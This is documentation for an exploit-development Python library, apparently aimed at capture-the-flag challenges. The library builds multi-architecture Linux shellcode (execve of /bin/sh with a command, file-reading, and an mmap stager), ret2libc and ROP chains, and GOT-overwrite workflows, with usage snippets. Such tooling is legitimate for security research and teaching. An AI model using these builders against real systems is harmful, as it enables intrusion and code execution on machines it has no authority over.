# Payload construction

`payloads` is an architecture-aware foundation for constructing Linux exploit
payload bytes. Its target catalog is broader than its payload builders. A
target being recognized means that its word width, byte order, ABI, register
convention, and assembler triple are known; it does **not** mean that every
payload operation is implemented for that target.

The authoritative coverage data is in `payloads.support`. It deliberately
separates three levels:

- `recognized`: target resolution and packing exist, but this capability has
  no builder for the target;
- `implemented`: a builder exists, but no end-to-end QEMU execution test
  covers the pair;
- `qemu-verified`: a builder exists and an opt-in QEMU execution test covers
  the raw result.

Each cell also exposes explicit `recognized`, `implemented`, and
`qemu_verified` booleans. The whole matrix can be serialized without custom
encoders:

```python
import json

from payloads.support import capability_support, support_matrix_data

print(capability_support("mipseb", "command").as_dict())
print(json.dumps(support_matrix_data(), indent=2))
```

The schema is versioned by `SUPPORT_SCHEMA_VERSION`. Consumers should use the
matrix instead of inferring payload support from `SUPPORTED_TARGETS`.
In the matrix, `stager` means the target-native mmap/read/mprotect shellcode;
the callback-driven `PayloadStager` belongs to `arb-executor`.

## Current coverage

The current command, ORW, exit, and RW-to-RX mmap-stager shellcode builders are
implemented and QEMU-tested for these exact Linux variants:

| Architecture | Bits | Endian | ABI |
| --- | ---: | --- | --- |
| x86 | 32 | little | i386 SysV |
| x86-64 | 64 | little | AMD64 SysV |
| ARM and Thumb | 32 | little and big | ARM EABI |
| ARM64 | 64 | little and big | AAPCS64 |
| MIPS32 | 32 | little and big | o32 |
| MIPS64 | 64 | little and big | n64 |
| RISC-V 32 | 32 | little | ILP32 |
| RISC-V 64 | 64 | little | LP64 |

PowerPC 32/64 (little and big endian), SPARC 32/64, and s390x are recognized
targets but do not have command, ORW, exit, or stager lowering. Symbolic static
syscall ROP is implemented for every catalog target, and symbolic static
function calls are implemented except on PPC64 ELFv1 and SPARC. Ret2libc
`system(command)` has the same direct-call exclusions. These ROP builders have
unit coverage but no QEMU execution coverage. Target-generic arbitrary-memory
adapters, explicit payload staging/triggering, and exact-libc call workflows
are implemented for every catalog target and are unit-tested, not QEMU-tested.

## Resolving an exact target

Builders accept a fully resolved `Target`, not a loose architecture string:

```python
from payloads import ABI, Endian, resolve_target

mips_be = resolve_target("mips32", bits=32, endian=Endian.BIG, abi=ABI.MIPS_O32)
amd64 = resolve_target("amd64")
```

Aliases with an endian suffix imply byte order (`mipsel`, `mipseb`, `armeb`,
`ppc64le`). Supplying a contradictory `endian=` raises
`UnsupportedTargetError`; it is never silently overridden. Unsuffixed ARM and
MIPS default to little endian. Unsuffixed PowerPC, SPARC, and s390 default to
big endian. RISC-V is currently little-endian only.

`Target.pack`, `unpack`, and `pack_words` always use the resolved word width
and endian. Packing rejects overflow unless `truncate=True` is requested
explicitly. The target also owns the function-call and syscall register
conventions and stack alignment. Thumb entries set bit zero through
`Payload.entry()`/`Target.function_pointer()`. A big-endian PPC64 ELFv1 symbol
is a function descriptor rather than a raw program counter, so
`Target.function_pointer()` rejects it without a descriptor- and TOC-aware
primitive.

## Command shellcode

`command_shellcode` emits position-independent raw code which performs
`execve("/bin/sh", ["/bin/sh", "-c", command], NULL)`. It does not rely on
pwntools shellcraft or a target libc.

```python
from payloads import command_shellcode, resolve_target

target = resolve_target("mipseb")
payload = command_shellcode("id; uname -a", target)

# Write payload.data into memory satisfying payload.memory, then transfer
# control to the ISA-correct entry (important for Thumb).
load_address = 0x410000
entry = payload.entry(load_address)
```

The command must be non-empty and contain no NUL byte. The generated temporary
stack image is capped at 1792 bytes and aligned for the target ABI. Inspect
`payload.memory` rather than assuming its requirements: the code bytes need an
executable mapping, and the generated command uses writable stack space.
`payload.metadata["requires_instruction_cache_sync_after_runtime_write"]` is
true on non-x86 targets; a runtime arbitrary-write path must perform the
platform-appropriate instruction-cache synchronization before jumping when
the environment requires it.

`orw_shellcode(path, target, max_bytes=0x400, output_fd=1)` emits one
position-independent open/read/write pass. It opens the NUL-free path
read-only, reads at most `max_bytes` once, writes the returned byte count once
to `output_fd`, and exits. It preserves embedded NULs in file data. It is not a
looping file copier: short reads and short writes are not retried. Its stack
image, including the read buffer, shares the 1792-byte cap.

### RW-to-RX stager

`mmap_stager(size, target, input_fd=0, page_size=0x1000)` allocates an anonymous
RW mapping, loops until it has read exactly `size` bytes, changes the complete
mapping to RX with `mprotect`, finalizes the target instruction cache, and
transfers control to the second stage. It never requests a simultaneous RWX
mapping.

```python
from payloads import command_shellcode, mmap_stager, resolve_target

target = resolve_target("arm64")
second_stage = command_shellcode("id", target)
first_stage = mmap_stager(len(second_stage.data), target, input_fd=0)

# Deliver/enter first_stage.data through the original executable-code
# primitive, then send exactly second_stage.data on input_fd.
```

`page_size` is explicit because the runtime page size is not an ISA constant.
EOF or a read error before the exact byte count takes the failure exit. ARM,
AArch64, MIPS, and RISC-V stagers perform their architecture-specific cache
maintenance; x86 relies on its coherent instruction cache. This solves the
second-stage W^X transition only: the first-stage bytes still need an initial
executable region or another valid control-flow path.

### LLVM requirement

Raw bytes are assembled by `LLVMAssembler`, which requires `llvm-mc` from
LLVM. Pass `LLVMAssembler("/absolute/path/to/llvm-mc")` when it is not on
`PATH`. `pyelftools` is used to extract `.text`; unresolved relocations are
rejected rather than copied into the payload. LLVM/LLD target support varies by
installation, so matrix recognition alone does not prove that a particular
local LLVM build can assemble a target.

`ld.lld` is not required for normal payload construction. It is used by the
QEMU test only to wrap the exact raw bytes in a minimal static ELF.

## Libc identity and runtime addresses

Never select offsets from the string `glibc 2.39` alone. Distribution patches,
toolchain choices, and package rebuilds can change symbols and gadgets without
changing the upstream version. `LibcImage.from_file` reads the exact ELF and
records its SHA-256 plus its GNU build ID when present:

```python
from payloads import LibcImage, RuntimeLayout

libc = LibcImage.from_file(
    "./libc.so.6",
    symbols=("puts", "system"),
    glibc_version="2.39",
    distro="ubuntu",
    package_release="0ubuntu8.4",
)
base = libc.base_from_leak("puts", leaked_puts)
system = libc.address("system", RuntimeLayout(libc_base=base))
```

The distro, package release, version, and source path are provenance metadata;
they do not replace the artifact digest. Preserve the challenge's actual libc
file and verify `LibcIdentity.matches()` if bytes may have changed. A
`LibcImage` supplies exact symbol offsets and base arithmetic; the separate ROP
and arbitrary-call builders consume it. The package does not discover the
remote libc, find gadgets, or leak a base.

`Address` represents an absolute value or an offset in `MAIN`, `LIBC`,
`LOADER`, `STACK`, or a named extra image. PIE/ASLR-relative values require a
matching `RuntimeLayout` base; missing bases raise instead of being guessed.

## Symbolic ret2libc and static ROP

ROP addresses stay symbolic until `ROPChain.materialize(layout)`. This keeps
PIE/main-image and libc-relative addresses separate and applies target word
width, endian, Thumb state bits, and function-pointer rules only after runtime
bases are known.

There is intentionally no universal gadget catalog. A `SemanticGadget`
describes the exact stack words consumed by a gadget from the challenge binary:
which slots populate registers, which slot supplies the next PC/LR/RA, fixed
slots, and clobbers. The chain selector can compose the supplied records, but
it does not disassemble a binary or assert that a gadget exists.

```python
from payloads import Address, Image, RuntimeLayout, resolve_target
from payloads.rop import SemanticGadget, build_ret2libc_system

target = resolve_target("x86_64")
# `libc` is a LibcImage loaded from the exact challenge artifact.
pop_rdi = SemanticGadget(
    target=target,
    address=Address(pop_rdi_offset, Image.LIBC, "pop rdi; ret"),
    frame_words=2,
    register_slots={"rdi": 0},
    next_pc_slot=1,
)
chain = build_ret2libc_system(
    libc,
    Address(bin_sh_offset, Image.LIBC, '"/bin/sh"'),
    gadgets=(pop_rdi,),
)
raw_chain = chain.materialize(RuntimeLayout(libc_base=leaked_libc_base))
```

`build_ret2libc_system` derives `system` only from the supplied exact
`LibcImage`; register ABIs still require suitable caller-supplied semantic
gadgets. i386 uses its real cdecl stack shape. Direct function calls reject
PPC64 ELFv1 (function descriptors/TOC are not modeled) and SPARC32/64 (register
windows and `o7 + 8` return frames are not modeled).

`build_static_call` and `build_static_syscall` use `MAIN`-relative offsets, so
the same descriptions cover non-PIE (`main_base=0` when offsets are virtual
addresses) and PIE once the main base is known. Generic static syscall chains
are modeled for every catalog target, including PPC64 ELFv1, but require exact
caller-supplied register-loading and syscall gadgets plus the correct Linux
syscall number. Static direct calls retain the PPC64 ELFv1/SPARC exclusions.
None of the ROP builders currently has end-to-end QEMU execution coverage.

## Arbitrary-read/write adapters and execution

`payloads.arbio` turns challenge-specific memory callbacks into strict,
target-aware operations. Callback addresses are absolute target addresses:

```python
from payloads.arbio import ArbitraryMemory, IOPrimitiveTraits

memory = ArbitraryMemory(
    target,
    read_at=arbread,  # arbread(address, size) -> exactly size bytes
    write_at=arbwrite,  # arbwrite(address, data) -> None or len(data)
    traits=IOPrimitiveTraits(
        read_chunk=0x100,
        write_chunk=8,
        read_alignment=1,
        write_alignment=8,
        write_width=8,
        verify_writes=True,
    ),
)
pointer = memory.read_ptr(pointer_address)
memory.write_ptr(pointer_address, replacement)
```

Transfers are chunked without implicit overreads, padding, or
read/modify/write. Declared address alignment and transfer width are enforced;
short callbacks raise structured errors. `read_ptr`/`write_ptr` use the exact
target word width and endian. Read-back verification requires a read callback,
and `probe()` is disabled unless `invalid_read_safe=True` explicitly says a
bad probe cannot kill or corrupt the target. `ArbitraryMemory.from_bytes_provider`
and `as_bytes_provider()` provide structural adapters for existing
`BytesProvider`-shaped objects.

Arbitrary read/write is not itself control flow. `PayloadStager` writes a
`Payload` at a caller-selected address and preflights NX/QEMU policy before the
first write. Executing it additionally requires an explicit target-matched
`ControlFlowTrigger`:

```python
from payloads.arbio import CallbackControlFlowTrigger, PayloadStager

stager = PayloadStager(
    memory,
    mitigations,
    make_executable=make_executable,  # optional (address, size) hook
    synchronize_instruction_cache=cache_sync,  # required when metadata says so
)
trigger = CallbackControlFlowTrigger(target, jump_to)
stager.stage_and_execute(
    command_shellcode("id", target),
    shellcode_address,
    trigger,
    verify=True,
)
```

The `make_executable` and cache-sync hooks are exploit primitives supplied by
the caller; the adapter does not synthesize them from arbitrary write. An
already executable region can instead be asserted with
`executable_region=True`. Legacy-all-executable QEMU policy permits the modeled
legacy path. Thumb entry-state adjustment is applied automatically. Staging
alone never invokes code.

For a useful data-only path, `build_shell_command_execve_data` builds a
target-width/endian `execve` argv image at a known writable address, and
`ExecveCallWorkflow` stages it then uses an explicit `FunctionCallPrimitive` to
call `execve` from the exact `LibcImage`:

```python
from payloads.arbio import (
    CallbackFunctionCall,
    ExecveCallWorkflow,
    PayloadStager,
    build_shell_command_execve_data,
)

data = build_shell_command_execve_data("id", target, writable_address)
workflow = ExecveCallWorkflow.from_libc(
    data,
    libc,
    RuntimeLayout(libc_base=leaked_libc_base),
)
workflow.execute(
    PayloadStager(memory, mitigations),
    CallbackFunctionCall(target, call_function),
    verify=True,
)
```

The function-call callback owns the ABI-level call primitive; it is not
derived from the memory callbacks. PPC64 ELFv1 calls require a callback marked
function-descriptor-aware. `GotSystemWorkflow` is an alternative for dynamic
binaries with no/partial RELRO: it writes the command, temporarily replaces a
specified GOT slot with exact-artifact `system`, calls the specified PLT entry,
and restores the original slot in `finally`. It rejects full RELRO/static
linkage before memory I/O and cannot promise restoration if the process exits,
the transport disconnects, or control never returns. None of these callback
workflows has QEMU end-to-end coverage.

## Mitigations and QEMU execute policy

`Mitigations` records PIE, NX, RELRO, dynamic/static linkage, and an explicit
`ExecutionPolicy`. These are caller-supplied facts; the payload package does
not inspect a process or QEMU version automatically.

- `ELF_PERMISSIONS` and `QEMU_ELF_PERMISSIONS` mean mapping execute bits are
  respected. With NX enabled, writable storage is not assumed executable.
- `QEMU_LEGACY_ALL_EXECUTABLE` models older/configured user-mode QEMU behavior
  where writable guest memory can be executed despite ELF permissions.
- `UNKNOWN` is conservative: with NX enabled,
  `require_shellcode_path()` requires a known executable region or an
  `mprotect`/`mmap`-style permission-changing primitive.

`require_got_overwrite()` permits a dynamic GOT overwrite only with no or
partial RELRO. Full RELRO and static linkage reject it. These checks validate a
chosen strategy; they do not bypass PIE, NX, RELRO, or ASLR by themselves.

Treat legacy-QEMU executability as an observed property of the exact challenge
runtime, not as an architecture property. Newer QEMU configurations commonly
respect guest execute permissions. Even when memory is executable, non-x86
self-modifying/runtime-written code may still require instruction-cache
synchronization.

## Tests

Run the normal foundation, lowering, assembly, and matrix tests with:

```sh
python3 -m unittest discover -s payloads/tests -v
```

Assembly tests skip when `llvm-mc` is unavailable. End-to-end execution is
opt-in because it needs LLVM, LLD, and the complete set of QEMU user emulators
for the primary matrix:

```sh
PWNC_QEMU_TESTS=1 python3 -m unittest discover -s payloads/tests -v
```

The QEMU tests link a minimal static ELF around exactly the bytes returned by
the command, ORW, and RW-to-RX stager builders, run each listed target, and
check command output, binary file bytes, and execution of an exact second-stage
exit payload. They use no foreign libc or sysroot. If any required
tool/emulator is absent, the QEMU test class is skipped; a skipped test is not
evidence that payloads ran on that host.

## Limitations

- Linux syscall numbers and ABIs are fixed to the exact catalog entries; other
  OSes, ARM OABI, MIPS n32, RISC-V big endian, and x32 are not represented.
- ROP builders need exact caller-supplied gadget semantics and offsets. They do
  not find gadgets, solve bad bytes, select a stack pivot, or validate a chain
  by executing it.
- There is no automatic leak discovery, remote-libc identification service,
  mitigation detection, or exploit-specific allocator/control-flow primitive.
- Arbitrary-memory workflows do not turn read/write callbacks into a function
  call, instruction-cache flush, or jump. Those capabilities must be supplied
  explicitly, and GOT restoration is only best-effort while control returns.
- QEMU shellcode tests do not establish native-hardware behavior and do not
  test old-versus-new QEMU execute-permission policy.
- Raw command/ORW payloads and the generic arbitrary-memory stager do not make
  memory executable by themselves. The mmap stager performs its own second
  stage RW-to-RX transition, but its first stage still needs an executable
  entry path. Callers must satisfy every `MemoryRequirement` and provide all
  required address leaks, permission/control primitives, and cache maintenance.
